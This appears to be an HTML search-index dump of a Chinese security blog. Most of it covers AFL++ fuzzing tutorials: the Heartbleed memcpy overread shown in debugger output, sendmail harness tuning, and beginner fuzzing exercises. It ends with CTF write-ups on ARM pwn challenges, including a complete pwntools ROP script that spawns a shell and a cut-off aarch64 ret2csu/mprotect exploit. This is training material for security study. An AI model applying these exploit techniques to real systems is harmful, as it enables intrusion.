&lt;p&gt;定位到&lt;code&gt;t1_lib.c&lt;/code&gt;中的&lt;code&gt;tls1_process_heartbeat&lt;/code&gt;的&lt;code&gt;memcpy(bp, pl, payload);&lt;/code&gt;即是触发心脏滴血的关键代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*RIP  0x555555744c9d (tls1_process_heartbeat+765) ◂— call 0x5555556f9520
────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────
   0x555555744c89 &amp;lt;tls1_process_heartbeat+745&amp;gt;    jne    tls1_process_heartbeat+1249                &amp;lt;tls1_process_heartbeat+1249&amp;gt;
 
   0x555555744c8f &amp;lt;tls1_process_heartbeat+751&amp;gt;    mov    byte ptr [rbx + 2], r12b
   0x555555744c93 &amp;lt;tls1_process_heartbeat+755&amp;gt;    lea    rdi, [rbx + 3]
   0x555555744c97 &amp;lt;tls1_process_heartbeat+759&amp;gt;    mov    rsi, r15
   0x555555744c9a &amp;lt;tls1_process_heartbeat+762&amp;gt;    mov    rdx, rbp
 ► 0x555555744c9d &amp;lt;tls1_process_heartbeat+765&amp;gt;    call   __asan_memcpy                &amp;lt;__asan_memcpy&amp;gt;
        rdi: 0x62b000000203 ◂— 0xbebebebebebebebe
        rsi: 0x62900000520b ◂— 0xbebebebebebebebe
        rdx: 0x6430
        rcx: 0x55555662f720 (__afl_area_initial) ◂— 0x1000000000002
 
   0x555555744ca2 &amp;lt;tls1_process_heartbeat+770&amp;gt;    lea    rdi, [rbx + rbp]
   0x555555744ca6 &amp;lt;tls1_process_heartbeat+774&amp;gt;    add    rdi, 3
   0x555555744caa &amp;lt;tls1_process_heartbeat+778&amp;gt;    mov    esi, 0x10
   0x555555744caf &amp;lt;tls1_process_heartbeat+783&amp;gt;    call   RAND_pseudo_bytes                &amp;lt;RAND_pseudo_bytes&amp;gt;
 
   0x555555744cb4 &amp;lt;tls1_process_heartbeat+788&amp;gt;    mov    rdi, qword ptr [rsp + 0x10]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
In file: /home/fk/文档/fuzzing/afl-training/challenges/heartbleed/openssl/ssl/t1_lib.c
   2581                 bp = buffer;
   2582                 
   2583                 /* Enter response type, length and copy payload */
   2584                 *bp++ = TLS1_HB_RESPONSE;
   2585                 s2n(payload, bp);
 ► 2586                 memcpy(bp, pl, payload);
   2587                 bp += payload;
   2588                 /* Random padding */
   2589                 RAND_pseudo_bytes(bp, padding);
   2590 
   2591                 r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd4e0 —▸ 0xc34000001b0 ◂— 0x0
01:0008│     0x7fffffffd4e8 —▸ 0x6180000000f0 ◂— 0x0
02:0010│     0x7fffffffd4f0 —▸ 0x618000000080 ◂— 0x200000000301
03:0018│     0x7fffffffd4f8 ◂— 0x644300005203
04:0020│     0x7fffffffd500 —▸ 0x618000000118 ◂— 0x0
05:0028│     0x7fffffffd508 —▸ 0x7fffffffd640 ◂— 0x3fff800
06:0030│     0x7fffffffd510 —▸ 0x7fffffffd540 ◂— 0x41b58ab3
07:0038│     0x7fffffffd518 —▸ 0xc34000001b6 ◂— 0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x555555744c9d tls1_process_heartbeat+765
   1   0x5555557b912a ssl3_read_bytes+13306
   2   0x5555557bdcda ssl3_get_message+538
   3   0x555555786697 ssl3_get_client_hello+535
   4   0x5555557823ed ssl3_accept+3405
   5   0x555555737a80 main+448
   6   0x7ffff7829d90 __libc_start_call_main+128
   7   0x7ffff7829e40 __libc_start_main+128
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&amp;gt; ni
=================================================================
==8348==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000009748 at pc 0x5555556f96d7 bp 0x7fffffffd4d0 sp 0x7fffffffcca0
READ of size 25648 at 0x629000009748 thread T0
[Attaching after Thread 0x7ffff7e99800 (LWP 8348) fork to child process 8359]
[New inferior 2 (process 8359)]
[Detaching after fork from parent process 8348]
[Inferior 1 (process 8348) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
process 8359 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
Warning:
Cannot insert breakpoint 2.
Cannot access memory at address 0x5555557b9125
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sendmail_1301&#34;&gt;sendmail_1301:&lt;/h2&gt;
&lt;h3 id=&#34;前言-3&#34;&gt;前言：&lt;/h3&gt;
&lt;p&gt;本文为afl-training的第三篇，针对&lt;code&gt;sendmail&lt;/code&gt;的fuzz，比较了一下普通harness普通fuzz与并行fuzz的效率提升，以及普通harness与优化过后的harness进行fuzz时的效率差别&lt;/p&gt;
&lt;h3 id=&#34;准备工作-3&#34;&gt;准备工作：&lt;/h3&gt;
&lt;p&gt;这道题已经准备好了&lt;code&gt;harness&lt;/code&gt;&lt;br&gt;
根据&lt;code&gt;makefile&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-makefile&#34;&gt;CFLAGS ?= -g

m1-bad: mime1-bad.c main.c
	${CC} ${CFLAGS} -o m1-bad mime1-bad.c main.c -I .

clean:
	rm -f *-bad *-ok
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们设置环境变量&lt;code&gt;export CC=afl-clang-fast&lt;/code&gt;后make即可&lt;br&gt;
生成&lt;code&gt;m1-bad&lt;/code&gt;，测试一下能正常运行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/文档/fuzzing/afl-training/challenges/sendmail/1301$ ./m1-bad 1.txt 
buf-obuf=64
obp-obuf=0
canary-obuf=4294967268
canary = GOOD
obuf = 1

canary should be GOOD
canary = GOOD
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;fuzzing-2&#34;&gt;Fuzzing:&lt;/h3&gt;
&lt;p&gt;建好文件夹和生成随机种子之后开始fuzz&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;afl-fuzz -i ipt/ -o opt/ -- ./m1-bad @@
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;没有修改过的&lt;code&gt;harness&lt;/code&gt;编译出的进行fuzz时表现如下：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660225566.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在3min左右的时候跑出了crash；&lt;/p&gt;
&lt;p&gt;然后我们使用并行fuzz：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;afl-fuzz -i ipt1/ -o opt1/ -M f1 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f2 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f3 -- ./m1-bad @@
afl-fuzz -i ipt1/ -o opt1/ -S f4 -- ./m1-bad @@
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这次我们不到1min主fuzzer就跑出了crash：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660232590.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后我们测试一下延迟初始化和持久化模式需要多久能跑出,修改一下harness:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;quot;my-sendmail.h&amp;quot;
#include &amp;lt;assert.h&amp;gt;

int main(int argc, char **argv)
{

     HDR *header;
     register ENVELOPE *e;
     FILE *temp;

     #ifdef __AFL_HAVE_MANUAL_CONTROL
     __AFL_INIT();
     #endif 
     while(__AFL_LOOP(1000))
     {
          assert(argc == 2);
          temp = fopen(argv[1], &amp;quot;r&amp;quot;);
          assert(temp != NULL);

          header = (HDR *)malloc(sizeof(struct header));

          header-&amp;gt;h_field = &amp;quot;Content-Transfer-Encoding&amp;quot;;
          header-&amp;gt;h_value = &amp;quot;quoted-printable&amp;quot;;
          header-&amp;gt;h_link = NULL;
          header-&amp;gt;h_flags = 0;

          e = (ENVELOPE *)malloc(sizeof(struct envelope));
          e-&amp;gt;e_id = &amp;quot;First Entry&amp;quot;;
          e-&amp;gt;e_dfp = temp;


          mime7to8(header, e);

          fclose(temp);
          free(e);
          free(header);
          return 0;
     }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重新make后进行fuzz：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1696660239113.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在2min30s左右跑出crash，相较于最原始的harness还是有效率提升的&lt;/p&gt;
&lt;h3 id=&#34;crash分析-3&#34;&gt;crash分析：&lt;/h3&gt;
&lt;p&gt;使用&lt;code&gt;afl-tmin&lt;/code&gt;精简样本：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for i in id*;do afl-tmin -i $i -o ./tmp/$i  -- ./m1-bad @@;done;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到简化后样本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/文档/fuzzing/afl-training/challenges/sendmail/1301/opt1/f1/crashes/tmp$ hexdump -C id\:000000\,sig\:11\,src\:000038\,time\:3687\,execs\:21373\,op\:havoc\,rep\:1 
00000000  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000230  30 30 30 30 30 30 30 30  30 30 30 3d 0a 30 30 30  |00000000000=.000|
00000240  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000260  30 30 30 3d 0a 30 30 30  30 30 30                 |000=.000000|
0000026b
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;后用&lt;code&gt;AFL_USE_ASAN=1&lt;/code&gt;的编译选项重新编译了一份之后跑样本确定crash发生处确实与给出的&lt;code&gt;mime1-bad.c&lt;/code&gt;中注释&lt;code&gt;BAD&lt;/code&gt;的地方吻合&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;==2927476==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffdc92 at pc 0x555555631800 bp 0x7fffffffdbb0 sp 0x7fffffffdba8
WRITE of size 1 at 0x7fffffffdc92 thread T0
[Attaching after Thread 0x7ffff7e9cc40 (LWP 2927476) fork to child process 2927479]
[New inferior 2 (process 2927479)]
[Detaching after fork from parent process 2927476]
[Inferior 1 (process 2927476) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
process 2927479 is executing new program: /usr/lib/llvm-14/bin/llvm-symbolizer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
    #0 0x5555556317ff in mime_fromqp /home/fk/文档/fuzzing/afl-training/challenges/sendmail/1301/mime1-bad.c:248:18
    #1 0x5555556317ff in mime7to8 /home/fk/文档/fuzzing/afl-training/challenges/sendmail/1301/mime1-bad.c:156:7
    #2 0x5555556323c6 in main /home/fk/文档/fuzzing/afl-training/challenges/sendmail/1301/main.c:94:11
    #3 0x7ffff7c29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #4 0x7ffff7c29e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #5 0x5555555733f4 in _start (/home/fk/文档/fuzzing/afl-training/challenges/sendmail/1301/opt/default/crashes/m1-bad+0x1f3f4) (BuildId: 774480b07edb24c4f93faf62426d5928c809433f)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;小结&#34;&gt;小结：&lt;/h2&gt;
&lt;p&gt;以上为afl-training几个具有代表性的练习，帮助熟悉afl++的fuzz流程，现整合为1篇&lt;/p&gt;
">afl_training </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/5Wt1I5xiU/"" data-c="
          &lt;p&gt;项目地址:&lt;a href=&#34;https://github.com/alex-maleno/Fuzzing-Module&#34;&gt;https://github.com/alex-maleno/Fuzzing-Module&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise1&#34;&gt;execersise1:&lt;/h3&gt;
&lt;p&gt;以下程序存在问题&lt;br&gt;
当输入的字符串的第一个或最后一个字符为&lt;code&gt;\x00&lt;/code&gt;时触发&lt;code&gt;abort()&lt;/code&gt;&lt;br&gt;
其次当循环遍历到的当前字符的数字比前一个遍历到的数字大1时触发&lt;code&gt;abort()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

using namespace std;

int main() {

   string str;

   cout &amp;lt;&amp;lt; &amp;quot;enter input string: &amp;quot;;
   getline(cin, str);
   cout &amp;lt;&amp;lt; str &amp;lt;&amp;lt; endl &amp;lt;&amp;lt; str [0] &amp;lt;&amp;lt; endl;

    if(str[0] == 0 || str[str.length() - 1] == 0) {
        abort();
    }
    else {
        int count = 0;
        char prev_num = &#39;x&#39;;
        while (count != str.length() - 1) {
            char c = str[count];
            if(c &amp;gt;= 48 &amp;amp;&amp;amp; c &amp;lt;= 57) {
                if(c == prev_num + 1) {
                    abort();
                }
                prev_num = c;
            } 
            count++;
        }
    }
    
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当前目录下创建&lt;code&gt;ipt,opt&lt;/code&gt;文件夹，在&lt;code&gt;ipt/&lt;/code&gt;下生成随机种子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dd if=/dev/urandom of=1.in bs=64 count=10
dd if=/dev/urandom of=2.in bs=64 count=10
dd if=/dev/urandom of=3.in bs=64 count=10
dd if=/dev/urandom of=4.in bs=64 count=10
dd if=/dev/urandom of=5.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用以下命令编译目标&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-clang-fast++ simple_crash.cpp -o sc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在当前目标文件夹下分别新建一个用于输入的文件夹和输出的文件夹&lt;br&gt;
然后开始fuzz&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;afl-fuzz -i ipt/ -o opt/ -- ./sc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本地环境下测试不到1min能将以上触发&lt;code&gt;abort()&lt;/code&gt;的输入全部跑出，输出存于crash的文件夹下&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977152581.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise2&#34;&gt;execersise2:&lt;/h3&gt;
&lt;p&gt;主要逻辑：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;/*
 * George Sidamon-Eristoff
 * 30 March 2022
 * Comp 98 - Senior Capstone, 2nd Semester
 * airplane_object.cpp contains the function contracs and definitions for the Airplane class
 *
 * Note: there are purposely not many comments so the bug is more difficult to find
 */

#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;

#include &amp;quot;airplane_object.hpp&amp;quot;


Airplane::Airplane(){
    crew.num = 2;
    crew.captain_name = &amp;quot;Captain&amp;quot;;
    crew.copilot_name = &amp;quot;CoPilot&amp;quot;;
}


void Airplane::takeoff(){
    if (crew.num &amp;gt;= 1) {
        std::cout &amp;lt;&amp;lt; &amp;quot;Takeoff!\n&amp;quot;;
    } else {
        std::cout &amp;lt;&amp;lt; &amp;quot;Nobody to fly the plane!\n&amp;quot;;
    }
    return;
}

void Airplane::land(){
    if (crew.num &amp;gt;= 1) {
        std::cout &amp;lt;&amp;lt; &amp;quot;Landed safely!\n&amp;quot;;
    } else {
        std::cout &amp;lt;&amp;lt; &amp;quot;Nobody left to land the plane!\n&amp;quot;;
    }
    return;
}

void Airplane::hire(){
    crew.num += 1;
    std::cout &amp;lt;&amp;lt; &amp;quot;Welcome aboard!\n&amp;quot;;
    return;
}


void Airplane::fire(){
    crew.num -= 1;
    std::cout &amp;lt;&amp;lt; &amp;quot;You&#39;re out of here!\n&amp;quot;;
    return;
}

void Airplane::interact() {
    std::string input  = &amp;quot;&amp;quot;;
    getline(std::cin, input);
    int input_length = input.length();
    if (input.empty()) {
        std::cout &amp;lt;&amp;lt; &amp;quot;No command.\n&amp;quot;;
    } else {
        int i = 0;
        while (input[i] != &#39;q&#39; and i &amp;lt; input_length) {
            // std::cout &amp;lt;&amp;lt; &amp;quot;i = &amp;quot; &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &amp;quot;  input[i] =&amp;quot; &amp;lt;&amp;lt; input[i] &amp;lt;&amp;lt; &amp;quot;\n&amp;quot;;
            if (input[i] == &#39;t&#39;) {
                takeoff();
            } else if (input[i] == &#39;l&#39;) {
                if (crew.num == 0) {
                    abort();
                }
                land();
            } else if (input[i] == &#39;h&#39;) {
                hire();
            } else if (input[i] == &#39;f&#39;) {
                fire();
            }
            i++;
        }
    }
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当输入&lt;code&gt;l&lt;/code&gt;时会判断&lt;code&gt;crew&lt;/code&gt;的数量，当&lt;code&gt;crew.num==0&lt;/code&gt;时程序触发&lt;code&gt;abort()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此题使用cmake，当前窗口临时设置环境变量指定编译器，设置好之后&lt;code&gt;env | grep &lt;/code&gt;查看&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  export CC=afl-clang-fast
  export CXX=afl-clang-fast++
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cmake . &amp;amp;&amp;amp; make 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之后正常fuzz，跑出7个crash，且都符合上述触发&lt;code&gt;abort()&lt;/code&gt;的条件&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977163715.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;execersise3&#34;&gt;execersise3:&lt;/h3&gt;
&lt;p&gt;此次练习熟悉AFL++的一个特性，&lt;code&gt;delayed initialization&lt;/code&gt;&lt;br&gt;
触发&lt;code&gt;abort()&lt;/code&gt;的函数存在于&lt;code&gt;specs.cpp&lt;/code&gt;中，很容易触发&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;
void Specs::choose_color() {
    std::string color;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter desired aircraft color: &amp;quot;;
    std::cin &amp;gt;&amp;gt; color;
    if (isNumber(color))
        abort();
}

void Specs::min_alt() {
    // bool too_low = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter aircraft minimum altitude: &amp;quot;;
    std::cin &amp;gt;&amp;gt; alt;
    // do {
        // too_low = false;
    if(alt &amp;lt; 0) {
        std::cout &amp;lt;&amp;lt; &amp;quot;too low. crashing!&amp;quot; &amp;lt;&amp;lt; std::endl;
        abort();
    }
    else if (alt &amp;gt; 500) {
        std::cout &amp;lt;&amp;lt; &amp;quot;too high. lowering to 500&amp;quot;;
        alt = 500;
        // too_low = true;
    }
    // } while(too_low);
}

void Specs::min_airspeed() {
    bool out_of_bounds = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter aircraft minimum airspeed: &amp;quot;;
    std::cin &amp;gt;&amp;gt; speed;
    do {
        out_of_bounds = false;
        if(speed &amp;lt; 0)
            abort();
        if(speed &amp;lt; 100) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too low. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; speed;
            out_of_bounds = true;
        } else if (speed &amp;gt; 200) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too high. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; speed;
            out_of_bounds = true;
        }
    } while(out_of_bounds);
}

void Specs::fuel_cap() {
    bool too_high = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter fuel capacity: &amp;quot;;
    std::cin &amp;gt;&amp;gt; fuel;
    do {
        too_high = false;
        if(fuel &amp;lt; 0)
            abort();
        if (fuel &amp;gt; 100) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too high. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; fuel;
            too_high = true;
        }
    } while(too_high);
}

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;官方文档 : &lt;a href=&#34;https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md&#34;&gt;https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官方文档中描述的afl++只执行一次程序，并在&lt;code&gt;main()&lt;/code&gt;之前停止，然后克隆这个主进程优化性能，如消除一些时间成本，比如程序的链接等，但在一些情况下可能并不总是有效，如加载一些较大的配置文件&lt;br&gt;
文档中有个词叫&lt;code&gt;Deferred initialization &lt;/code&gt;,翻译过来可以叫作&lt;code&gt;延迟初始化&lt;/code&gt;,指在&lt;code&gt;main()&lt;/code&gt;函数中的某个位置开始克隆，在一些情况下可以有效提高效率，只需要使用如下命令:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#ifdef __AFL_HAVE_MANUAL_CONTROL
__AFL_INIT();
#endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上命令添加在&lt;code&gt;main()&lt;/code&gt;中初始化&lt;code&gt;spec&lt;/code&gt;后，比如&lt;code&gt;specs-slice.cpp&lt;/code&gt;中：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;/*
 *
 *
 * This file isolates the Specs class and tests out the 
 * choose_color function specifically.
 * 
 * 
 * 
 */

#include &amp;quot;specs.h&amp;quot;

int main(int argc, char** argv) {
    // In order to call any functions in the Specs class, a Specs
    // object is necessary. This is using one of the constructors
    // found in the Specs class.
    Specs spec(505, 110, 50);
    // By looking at all the code in our project, this is all the 
    // necessary setup required. Most projects will have much more
    // that is needed to be done in order to properly setup objects.

    // This section should be in your code that you write after all the 
    // necessary setup is done. It allows AFL++ to start from here in 
    // your main() to save time and just throw new input at the target.
    #ifdef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif

    spec.choose_color();
    //spec.min_alt();

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上说明结束后进行fuzz&lt;/p&gt;
&lt;p&gt;设置&lt;code&gt;env&lt;/code&gt;环境变量后make:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  export CC=afl-clang-fast
  export CXX=afl-clang-fast++
  make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当前目录下创建&lt;code&gt;ipt,opt&lt;/code&gt;文件夹，在&lt;code&gt;ipt/&lt;/code&gt;下生成随机种子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dd if=/dev/urandom of=1.in bs=64 count=10
dd if=/dev/urandom of=2.in bs=64 count=10
dd if=/dev/urandom of=3.in bs=64 count=10
dd if=/dev/urandom of=4.in bs=64 count=10
dd if=/dev/urandom of=5.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之后的fuzz都能跑出对应crash&lt;br&gt;
分别测试了默认初始化和延迟初始化的速度：&lt;br&gt;
延迟：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977127711.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
默认：&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977134607.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
还是可以发现较明显的速度差异&lt;/p&gt;
">Fuzzing Module</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VLuqmf0iP/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言：&lt;/h3&gt;
&lt;p&gt;记录一下最近做的几道异构入门题&lt;/p&gt;
&lt;h3 id=&#34;jarvisoj_typo&#34;&gt;jarvisoj_typo：&lt;/h3&gt;
&lt;p&gt;32位arm，静态链接，本地测出偏移后rop即可&lt;br&gt;
注意的是因为去掉了符号表所以&lt;code&gt;system&lt;/code&gt;函数可能需要找一会儿，可以使用xref找&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,27348]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-arm-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;, &amp;quot;./typo&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;arm&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

str_sh=0x6c384
sys_addr=0x110b4


payload=cyclic(0x200)
io.sendafter(b&amp;quot;t\n&amp;quot;,b&amp;quot;\n&amp;quot;)
# io.send(payload)

#offset 112 
#0x00020904: pop {r0, r4, pc}; 


payload=cyclic(112)+p32(0x20904)+p32(str_sh)*2+p32(sys_addr)
io.sendafter(b&amp;quot;\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;shanghai2018_babyarm&#34;&gt;shanghai2018_babyarm：&lt;/h3&gt;
&lt;p&gt;aarch64动态链接，开启nx，存在mprotect函数可以开rwx段写shellcode&lt;br&gt;
注意一下老生常谈的布栈问题&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,25721]
#libc = ELF(&#39;&#39;)
elf = ELF(&#39;./pwn&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-aarch64-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;aarch64&#39;, os=&#39;linux&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        context(arch=&#39;aarch64&#39;, os=&#39;linux&#39;)
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

csu_2=0x4008CC
# LDP             X19, X20, [SP,#var_s10]
# LDP             X21, X22, [SP,#var_s20]
# LDP             X23, X24, [SP,#var_s30]
# LDP             X29, X30, [SP+var_s0],#0x40
# RET

#RET 跳转的是X30保存的地址，X30存放返回地址

csu_1=0x4008ac
# LDR             X3, [X21,X19,LSL#3]  此处控制X19值为0即可将X21值赋值给X3
# MOV             X2, X22
# MOV             X1, X23
# MOV             W0, W24
# ADD             X19, X19, #1
# BLR             X3
# CMP             X19, X20
# B.NE            loc_4008AC



mprotect=elf.plt[b&amp;quot;mprotect&amp;quot;]
# STP             X29, X30, [SP,#-0x10+var_s0]!
# MOV             X29, SP
